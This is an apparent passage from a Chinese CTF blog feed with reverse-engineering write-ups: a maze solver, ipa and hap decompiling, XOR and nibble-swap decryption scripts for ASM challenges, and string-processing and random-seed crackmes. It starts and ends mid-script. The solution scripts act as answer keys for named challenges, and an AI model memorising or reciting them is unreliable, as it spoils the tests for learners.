000 000&quot;);<br>  strcpy(v13, &quot;0         0 0   0   0&quot;);<br>  strcpy(&amp;v13[22], &quot;000000000000000000000&quot;);&#x27;&#x27;&#x27;<br>maze=[(i[-24:-3]) for i in maze.split(&#x27;\n&#x27;)]<br><br><br>for i in maze:<br>    print(i)<br># print(len(maze),(len(maze[0])))<br>from hashlib import md5<br>def finda(d):<br>    x,y=d[0],d[1]-1<br>    return (x,y,&#x27;a&#x27;)<br>def findw(d):<br>    x,y=d[0]-1,d[1]<br>    return (x,y,&#x27;w&#x27;)<br>def finds(d):<br>    x,y=d[0]+1,d[1]<br>    return (x,y,&#x27;s&#x27;)<br>def findd(d):<br>    x,y=d[0],d[1]+1<br>    return (x,y,&#x27;d&#x27;)<br>def find0(d,row,column):<br>    if d[0]==0:<br>        t=[finda(d),findd(d),finds(d)]<br>    elif d[0]==row-1:<br>        t=[findw(d),finda(d),findd(d)]<br>    elif d[1]==0:<br>        t=[findw(d),findd(d),finds(d)]<br>    elif d[1]==column-1:<br>        t=[findw(d),finda(d),finds(d)]<br>    else: t=[findw(d),finda(d),finds(d),findd(d)]<br>    tmp=[]<br>    for x,y,r in t:<br>        if maze[x][y]==&#x27; &#x27;or maze[x][y]==&#x27;*&#x27; :<br>            tmp.append((x,y,r))<br>    return tmp<br><br>def get(o,O,row,column):#起点，终点，行，列<br>    SUM=[]<br>    Road = [(&#x27;&#x27;, o)]<br>    while True:<br>        road=[]<br>        for (r_pre,d) in Road:<br>            if d==O:#终点<br>                SUM.append((len(r_pre),r_pre,))<br>                print(r_pre.encode())<br>                print(&#x27;NSSCTF&#123;&#x27;+md5(r_pre.encode()).hexdigest()+&#x27;13371337&#x27;+&#x27;&#125;&#x27;)<br>                exit()<br>                # exit()<br>            next=find0(d,row,column)<br>            for x,y,r in next:<br>                if len(r_pre)&gt;=1:<br>                    if &#x27;ws&#x27;in r_pre[-1]+r or &#x27;sw&#x27; in r_pre[-1]+r:<br>                        continue<br>                    if &#x27;ad&#x27; in r_pre[-1] + r or &#x27;da&#x27; in r_pre[-1] + r:<br>                        continue<br>                road.append((r_pre+r,(x,y)))<br>        # print(road)<br>        Road=road<br><br>row,column=21,21<br>get((15,0),(7,20),row,column)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1722245042043-0f1e8bb4-abac-453b-b0d7-b2c448126fbb-574011.png" alt="1722245042043-0f1e8bb4-abac-453b-b0d7-b2c448126fbb.png"></p><blockquote><p>更新: 2024-07-29 17:33:02<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/qpt77zl7ce0pzudz">https://www.yuque.com/chaye-apqbl/vsc85q/qpt77zl7ce0pzudz</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/ios%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/ios%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ios逆向"><a href="#ios逆向" class="headerlink" title="ios逆向"></a>ios逆向</h1><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a><font style="color:rgb(77, 77, 77);">方法</font></h1><p><font style="color:rgb(77, 77, 77);">将ipa文件后缀改成.zip，并解压</font></p><p><img src="/./img/l8z4rmjD6EYN9WtW/1747205821481-19cec022-8677-4174-9936-5b84f407b328-808738.png" alt="1747205821481-19cec022-8677-4174-9936-5b84f407b328.png"></p><p><font style="color:rgb(77, 77, 77);">显示包内容，找到exec可执行文件，将其拖入64位IDA，</font></p><p><img src="/./img/l8z4rmjD6EYN9WtW/1747205856722-8fcbe5e0-4953-437d-935f-1d3f703558ba-232152.png" alt="1747205856722-8fcbe5e0-4953-437d-935f-1d3f703558ba.png"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ipa（校赛）"><a href="#ipa（校赛）" class="headerlink" title="ipa（校赛）"></a>ipa（校赛）</h2><p>后缀改成zip然后解压</p><p>将exec文件拖入ida反编译</p><p><img src="/./img/l8z4rmjD6EYN9WtW/1747206676676-b1a270f2-a557-4686-a42f-2db66f880c12-388306.png" alt="1747206676676-b1a270f2-a557-4686-a42f-2db66f880c12.png"></p><p>加载的时候没看到最上面的函数（所以说不能只盯着main函数看）</p><p><img src="/./img/l8z4rmjD6EYN9WtW/1747206965205-337d5f3e-4a3e-4c64-ad0e-520ead96d7e1-673631.png" alt="1747206965205-337d5f3e-4a3e-4c64-ad0e-520ead96d7e1.png"></p><p>数据在src里面</p><p><img src="/./img/l8z4rmjD6EYN9WtW/1747207108017-1a3f6a32-9be5-438c-a7e2-8db30fa5da67-250211.png" alt="1747207108017-1a3f6a32-9be5-438c-a7e2-8db30fa5da67.png"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">a=&#x27;Ios&#x27;<br>miwen=[0x2F,0x3,0x12,0x2E,0x14,0x21,0x2C,0x19,0x16,0x3B,0x1C,0x16,0x16,0x9,0x43,0x3B,0x30,0x3A,0x79,0x1C,0x2C,0x78,0x1C,0x2C,0x0,0x1,0x7,0x2C,0x1D,0x16,0x3A,0x3B,0x1A,0x27,0x8,0xE]<br><span class="hljs-section">#print(len(miwen))</span><br>for i in range(len(miwen)):<br><span class="hljs-code">    b=miwen[i]^ord(a[i%3])</span><br><span class="hljs-code">    print(chr(b),end=&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><p><img src="/./img/l8z4rmjD6EYN9WtW/1747207305281-7bb2bab9-cc9b-4ca4-900b-35138d365388-307509.png" alt="1747207305281-7bb2bab9-cc9b-4ca4-900b-35138d365388.png"></p><blockquote><p>更新: 2025-05-14 15:29:28<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/dncfi1ynxhaq4f5c">https://www.yuque.com/chaye-apqbl/vsc85q/dncfi1ynxhaq4f5c</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/index/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/index/</url>
    
    <content type="html"><![CDATA[<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><blockquote><p>更新: 2024-11-13 14:48:41<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fnudtw6ykgrk9ml2">https://www.yuque.com/chaye-apqbl/vsc85q/fnudtw6ykgrk9ml2</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/hap%EF%BC%88%E9%B8%BF%E8%92%99%E9%80%86%E5%90%91%EF%BC%89/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/hap%EF%BC%88%E9%B8%BF%E8%92%99%E9%80%86%E5%90%91%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="hap（鸿蒙逆向）"><a href="#hap（鸿蒙逆向）" class="headerlink" title="hap（鸿蒙逆向）"></a>hap（鸿蒙逆向）</h1><p><a href="https://github.com/ohos-decompiler/abc-decompiler/releases">https://github.com/ohos-decompiler/abc-decompiler/releases</a></p><p>看到hap文件先解压，这相当于一个压缩包</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a><font style="color:rgb(0, 0, 0);">使用</font></h2><p><font style="color:rgb(0, 0, 0);">‍</font></p><p><font style="color:rgb(0, 0, 0);">目前 abc-decompiler 只支持拖入 .abc 文件进行分析， abc 文件可以通过解压 hap 包获取</font></p><p><font style="color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(0, 0, 0);">期间安装后发现无法打开abc文件，问了ai发现是自身的java版本过低，要求17版本以上</font></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a><font style="color:rgb(0, 0, 0);">例题</font></h1><h2 id="harre校赛"><a href="#harre校赛" class="headerlink" title="harre校赛"></a>harre校赛</h2><p><font style="color:rgb(0, 0, 0);">主要还是熟悉这个hap怎么逆向的</font></p><p><font style="color:rgb(0, 0, 0);">进去后直接就看到一个base64变表加密</font></p><p><img src="/./img/icWjLmsmniNgBLx8/1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e-202919.png" alt="1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e.png"></p><p><img src="/./img/icWjLmsmniNgBLx8/1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891-835970.png" alt="1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891.png"></p><p><img src="/./img/icWjLmsmniNgBLx8/1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051-283637.png" alt="1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051.png"></p><blockquote><p>更新: 2025-05-12 15:54:05<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fu6gwcq1kwb8niy2">https://www.yuque.com/chaye-apqbl/vsc85q/fu6gwcq1kwb8niy2</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/ELF%E6%96%87%E4%BB%B6%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/ELF%E6%96%87%E4%BB%B6%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ELF文件反编译"><a href="#ELF文件反编译" class="headerlink" title="ELF文件反编译"></a>ELF文件反编译</h1><blockquote><p>更新: 2024-12-15 10:46:15<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/cxcxqfzdv1gnoge7">https://www.yuque.com/chaye-apqbl/vsc85q/cxcxqfzdv1gnoge7</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/ASM%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/ASM%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ASM逆向"><a href="#ASM逆向" class="headerlink" title="ASM逆向"></a>ASM逆向</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p>16位DOS不能进行反编译，只能放入32位看汇编</p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721293331071-31d91670-4017-496f-b56c-ffc12175a49f-260826.png" alt="1721293331071-31d91670-4017-496f-b56c-ffc12175a49f.png"></p><p><font style="color:#000000;">开头载入了两个数据dseg、seg001<br></font><font style="color:#000000;">往上翻可以找到<br></font><font style="color:#000000;">一个是提示字符</font></p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721293366698-a143378b-bbd2-4024-bb4d-5c5794664a83-011312.png" alt="1721293366698-a143378b-bbd2-4024-bb4d-5c5794664a83.png"></p><p><font style="color:#000000;">一</font><font style="background-color:#F4F5F5;">个是密文</font></p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721293271708-b0a7b174-1e61-4197-85b4-a4e796eff90c-236601.png" alt="1721293271708-b0a7b174-1e61-4197-85b4-a4e796eff90c.png"></p><p><font style="color:#000000;">把每个数前四位和后四位交换，再与23异或<br></font><font style="color:#000000;">构建解密脚本（注意还原后的结果%256，不然打不出来正确的结果）</font></p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721293547584-64f5faf0-1c49-4351-b750-1aa335770490-171567.png" alt="1721293547584-64f5faf0-1c49-4351-b750-1aa335770490.png"></p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721294425394-af55ae91-db34-453b-8e7a-0e01b3bb7dd9-283101.png" alt="1721294425394-af55ae91-db34-453b-8e7a-0e01b3bb7dd9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">#easyasm<br>#0x91, 0x61, 0x01, 0xC1, 0x41,<br>#0xA0, 0x60, 0x41, 0xD1, 0x21,<br>#0x14, 0xC1, 0x41, 0xE2, 0x50,<br>#0xE1, 0xE2, 0x54, 0x20, 0xC1,<br>#0xE2, 0x60, 0x14, 0x30, 0xD1,<br>#0x51, 0xC0, 0x17<br>from Crypto.Util.number import *<br>enc=[0x91, 0x61, 0x01, 0xC1, 0x41,<br>     0xA0, 0x60, 0x41, 0xD1, 0x21,<br>     0x14, 0xC1, 0x41, 0xE2, 0x50,<br>     0xE1, 0xE2, 0x54, 0x20, 0xC1,<br>     0xE2, 0x60, 0x14, 0x30, 0xD1,<br>     0x51, 0xC0, 0x17]<br>flag=b&#x27;&#x27;<br>for i in enc:<br>    flag += long_to_bytes((((i^23)&lt;&lt;4)+((i^23)&gt;&gt;4))%256)<br>print(flag)<br></code></pre></td></tr></table></figure><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721634069383-f7b17c35-45d1-43c1-99ec-30e0ce0fb9c4-344019.png" alt="1721634069383-f7b17c35-45d1-43c1-99ec-30e0ce0fb9c4.png"></p><p>还是放入32位看汇编</p><p>看到一串可疑的数据,打印发现不是flag,再仔细观察一下</p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721634151878-50af2bfb-4323-461e-ba70-6ea3de5ca99f-410128.png" alt="1721634151878-50af2bfb-4323-461e-ba70-6ea3de5ca99f.png"></p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721634667266-abfebca1-e202-496c-bcfe-0d27588c9c3f-214207.png" alt="1721634667266-abfebca1-e202-496c-bcfe-0d27588c9c3f.png"></p><p>发现他进行了异或,这里将0x10赋给了cl,然后跟al里面的元素异或</p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721634583916-a763cdb7-8c81-47db-b299-e307b1c294b3-685449.png" alt="1721634583916-a763cdb7-8c81-47db-b299-e307b1c294b3.png"></p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721634650814-c6ca89f2-71c1-424a-aa22-28ba18d5c321-246294.png" alt="1721634650814-c6ca89f2-71c1-424a-aa22-28ba18d5c321.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain"># include&lt;stdio.h&gt;<br># include&lt;string.h&gt;<br>int<br>main()<br>&#123;<br><br>    unsigned<br>char<br>num[] =<br>&#123;<br>    0x4E, 0x6F, 0x74, 0x20, 0x65, 0x71, 0x75, 0x61, 0x6C, 0x21,<br>    0x24, 0x45, 0x71, 0x75, 0x61, 0x6C, 0x21, 0x24, 0x58, 0x54,<br>    0x53, 0x44, 0x56, 0x6B, 0x5A, 0x65, 0x63, 0x64, 0x4F, 0x71,<br>    0x4F, 0x75, 0x23, 0x63, 0x69, 0x4F, 0x71, 0x43, 0x7D, 0x6D,<br>    0x24<br>&#125;;<br><br>for (int i=0;i &lt; 41;i++)<br>&#123;<br>    num[i] = num[i] ^ 0x10;<br>printf(&quot;%c&quot;, num[i]);<br>&#125;<br>return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h2><p>给了一个txt文件，发现数据和xor，编写脚本</p><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721792259818-13883526-c3e6-4a2c-9b59-3297dfa17121-756155.png" alt="1721792259818-13883526-c3e6-4a2c-9b59-3297dfa17121.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]<br>for i in range(len(a)):<br>    a[i]^=0x33<br>    print(chr(a[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_3kIFKW49Dj8e4wK0/1721792289136-d8840be3-4701-4021-a2ab-ee280f0066c0-757742.png" alt="1721792289136-d8840be3-4701-4021-a2ab-ee280f0066c0.png"></p><blockquote><p>更新: 2024-07-24 11:38:13<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/arorgx1mgg0amcn0">https://www.yuque.com/chaye-apqbl/vsc85q/arorgx1mgg0amcn0</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/"/>
    <url>/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h1><h1 id="例题-Cr0ssfun"><a href="#例题-Cr0ssfun" class="headerlink" title="例题 Cr0ssfun"></a>例题 Cr0ssfun</h1><p>放入64ida，发现check函数就是不断判断读入的字符<img src="/./img/49277317_wbdCpSstdX3iTjf5/1722234390731-81ace62d-318b-4c04-891f-586010b21054-479090.png" alt="1722234390731-81ace62d-318b-4c04-891f-586010b21054.png"></p><p><img src="/./img/49277317_wbdCpSstdX3iTjf5/1722234438327-e1408a2e-2429-4228-999e-958f2e9aeb08-040388.png" alt="1722234438327-e1408a2e-2429-4228-999e-958f2e9aeb08.png"></p><p>这边直接手搓一个代码，得到flag</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plain">a1=[0]*48<br>a1[10] = 112<br>a1[13] = 64<br>a1[3] = 102<br>a1[26] = 114<br>a1[20] = 101<br>a1[7] = 48<br>a1[16] = 95<br>a1[11] = 112<br>a1[23] = 101<br>a1[30] = 117<br>a1[0] = 119<br>a1[6] = 50<br>a1[22] = 115<br>a1[31] =110<br>a1[12] = 95<br>a1[15] = 100<br>a1[8] = 123<br>a1[18] = 51<br>a1[28] = 95<br>a1[21] = 114<br>a1[2] = 116<br>a1[9] = 99<br>a1[32] = 125<br>a1[19] = 118<br>a1[5] = 48<br>a1[14] = 110<br>a1[4] = 50<br>a1[17] = 114<br>a1[29] = 102<br>a1[17] = 114<br>a1[24] = 95<br>a1[1] = 99<br>a1[25] = 64<br>a1[27] = 101<br>for i in range(48):<br>    if(a1[i]!=0):<br>        print(chr(a1[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_wbdCpSstdX3iTjf5/1722234513686-55efe0eb-e980-4d76-842e-7ca157cc3e89-754210.png" alt="1722234513686-55efe0eb-e980-4d76-842e-7ca157cc3e89.png"></p><h2 id="大佬的exp"><a href="#大佬的exp" class="headerlink" title="大佬的exp"></a>大佬的exp</h2><p>复制ida中的判断条件，注意复制的格式尽量一致，例如每一次都给后面留一个空格，便于之后进行字符串处理，结果为：</p><p><img src="/./img/49277317_wbdCpSstdX3iTjf5/1722234553909-f366933a-7444-40a0-859c-f23d92bffdfa-698640.jpeg" alt="1722234553909-f366933a-7444-40a0-859c-f23d92bffdfa.jpeg"></p><p>得到这个字符串后就可以开始处理了。首先我们把文件保存为”.examp.txt”,注意直接赋值给python字符串是不行的，因为有很多换行符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">file=open(&quot;.examp.txt&quot;)<br>mystr=file.read()<br>print(mystr.replace(&quot;\n&quot;,&quot;&quot;))<br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a1[10] == 112      &amp;&amp; a1[13] == 64      &amp;&amp; a1[3] == 102      &amp;&amp; a1[26] == 114      &amp;&amp; a1[20] == 101   &amp;&amp; a1[7] == 48      &amp;&amp; a1[16] == 95      &amp;&amp; a1[11] == 112      &amp;&amp; a1[23] == 101      &amp;&amp; a1[30] == 117      &amp;&amp; *a1 == 119 &amp;&amp; a1[6] == 50 &amp;&amp; a1[22] == 115 &amp;&amp; a1[31] == 110 &amp;&amp; a1[12] == 95     &amp;&amp; a1[15] == 100      &amp;&amp; a1[8] == 123      &amp;&amp; a1[18] == 51      &amp;&amp; a1[28] == 95      &amp;&amp; a1[21] == 114 &amp;&amp; a1[2] == 116      &amp;&amp; a1[9] == 99      &amp;&amp; a1[32] == 125      &amp;&amp; a1[19] == 118      &amp;&amp; a1[5] == 48      &amp;&amp; a1[14] == 110    &amp;&amp; a1[4] == 50 &amp;&amp; a1[17] == 114 &amp;&amp; a1[29] == 102 &amp;&amp; a1[17] == 114 &amp;&amp; a1[24] == 95 &amp;&amp; a1[1] == 99 &amp;&amp; a1[25] == 64 &amp;&amp; a1[27] == 101<br></code></pre></td></tr></table></figure><p><font style="color:rgb(229, 234, 243);background-color:rgb(29, 30, 31);">可以看到还不太对齐，由于我们之前复制的格式比较一致，其实我们看到的缩进都是由六个空格所组成，直接使用replace把缩进改成单个空格，保持格式一致:</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">file=open(&quot;.examp.txt&quot;)<br>mystr=file.read()<br>mystr=mystr.replace(&quot;\n&quot;,&quot;&quot;)<br>print(mystr.replace(&quot;      &quot;,&quot; &quot;))<br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a1[10] == 112 &amp;&amp; a1[13] == 64 &amp;&amp; a1[3] == 102 &amp;&amp; a1[26] == 114 &amp;&amp; a1[20] == 101   &amp;&amp; a1[7] == 48 &amp;&amp; a1[16] == 95 &amp;&amp; a1[11] == 112 &amp;&amp; a1[23] == 101 &amp;&amp; a1[30] == 117      &amp;&amp; *a1 == 119 &amp;&amp; a1[6] == 50 &amp;&amp; a1[22] == 115 &amp;&amp; a1[31] == 110 &amp;&amp; a1[12] == 95     &amp;&amp; a1[15] == 100 &amp;&amp; a1[8] == 123 &amp;&amp; a1[18] == 51 &amp;&amp; a1[28] == 95 &amp;&amp; a1[21] == 114 &amp;&amp; a1[2] == 116 &amp;&amp; a1[9] == 99 &amp;&amp; a1[32] == 125 &amp;&amp; a1[19] == 118 &amp;&amp; a1[5] == 48 &amp;&amp; a1[14] == 110     &amp;&amp; a1[4] == 50 &amp;&amp; a1[17] == 114 &amp;&amp; a1[29] == 102 &amp;&amp; a1[17] == 114 &amp;&amp; a1[24] == 95 &amp;&amp; a1[1] == 99 &amp;&amp; a1[25] == 64 &amp;&amp; a1[27] == 101<br></code></pre></td></tr></table></figure><p><font style="color:rgb(229, 234, 243);background-color:rgb(29, 30, 31);">结果已经比较适合进行字符串处理了，但在此之前我们还能进行一步小小的处理，将” &#x3D;&#x3D; “全部换为”&#x3D;“,将” &amp;&amp; “全部换为”&amp;”,避免进行split分割的时候多出来一部分难处理的地方。替换的函数也是replace,过程同上。替换完毕后可以进行字符串处理，得到最后的flag。</font>**<br>**<font style="color:rgb(229, 234, 243);background-color:rgb(29, 30, 31);">最后一部处理之后，字符串如下:</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a1[10]=112&amp;a1[13]=64&amp;a1[3]=102&amp;a1[26]=114&amp;a1[20]=101&amp;a1[7]=48&amp;a1[16]=95&amp;a1[11]=112&amp;a1[23]=101&amp;a1[30]=117&amp;*a1=119&amp;a1[6]=50&amp;a1[22]=115&amp;a1[31]=110&amp;a1[12]=95&amp;a1[15]=100&amp;a1[8]=123&amp;a1[18]=51&amp;a1[28]=95&amp;a1[21]=114&amp;a1[2]=116&amp;a1[9]=99&amp;a1[32]=125&amp;a1[19]=118&amp;a1[5]=48&amp;a1[14]=110&amp;a1[4]=50&amp;a1[17]=114&amp;a1[29]=102&amp;a1[17]=114&amp;a1[24]=95&amp;a1[1]=99&amp;a1[25]=64&amp;a1[27]=101<br></code></pre></td></tr></table></figure><p><font style="color:rgb(229, 234, 243);background-color:rgb(29, 30, 31);">本来用mystr.count(“&#x3D;”)数了，有34个元素，结果a1[17]被赋了两次值，我们用in可以判断是否已经存在</font><strong><font style="color:rgb(229, 234, 243);background-color:rgb(29, 30, 31);"><br></font></strong><font style="color:rgb(229, 234, 243);background-color:rgb(29, 30, 31);">综上，代码如下:</font></p><blockquote><p>更新: 2024-07-29 14:40:21<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ew2yuwbyt38kgz2d">https://www.yuque.com/chaye-apqbl/vsc85q/ew2yuwbyt38kgz2d</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0python.random/"/>
    <url>/2026/01/19/RE/%E4%BE%8B%E9%A2%98/NSSCTF/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0python.random/</url>
    
    <content type="html"><![CDATA[<h1 id="伪随机数python-random"><a href="#伪随机数python-random" class="headerlink" title="伪随机数python.random"></a>伪随机数python.random</h1><p>例题：NSSCTF fakerandom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">import random<br>flag = &#x27;xxxxxxxxxxxxxxxxxxxx&#x27;<br>random.seed(1)<br>l = []<br>for i in range(4):<br>    l.append(random.getrandbits(8))<br>result=[]<br>for i in range(len(l)):<br>    random.seed(l[i])<br>    for n in range(5):<br>        result.append(ord(flag[i*5+n])^random.getrandbits(8))<br>print(result)<br># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]<br></code></pre></td></tr></table></figure><p>首先运行看看l里面有什么</p><p><img src="/./img/49277317_A3G5FKHPZOqt9JNJ/1719897955929-a4ced28d-f685-4916-8fc1-6ab52c6309c1-009487.png" alt="1719897955929-a4ced28d-f685-4916-8fc1-6ab52c6309c1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import random<br>flag = &#x27;xxxxxxxxxxxxxxxxxxxx&#x27;<br>result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]<br>key = []<br>random.seed(1)<br>l = []<br>for i in range(4):<br>    l.append(random.getrandbits(8))<br>#print(l)<br>result=[]<br>for i in 